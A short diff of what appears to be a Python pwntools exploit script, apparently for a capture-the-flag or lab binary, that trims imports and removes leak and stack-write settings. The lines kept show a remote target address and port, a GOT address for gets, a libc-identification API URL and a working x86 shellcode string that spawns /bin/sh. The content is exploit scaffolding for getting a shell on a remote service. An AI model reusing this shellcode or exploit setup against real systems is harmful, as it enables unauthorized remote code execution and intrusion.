@@ -1,7 +1,6 @@
 import requests
 import json
-from pwn import remote, u32, p32, p64, log, flat, process
-import argparse
+from pwn import remote, u32, p32, log
 
 remoteIp = '192.168.0.156'
 remotePort = 9000
@@ -19,11 +18,7 @@ gotGets = 0x80497a8
 OUTPUT_LINES_BEFORE = 6
 OUTPUT_LINES_AFTER = 2
 
-writeToStack = False
-leakNo = 30
-leakDelim = b"Welcome"
 shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
-redirectStdErr = True
 
 HEADERS = {'Content-Type': 'application/json'}
 FIND_LIBC_URL = 'https://libc.rip/api/find'
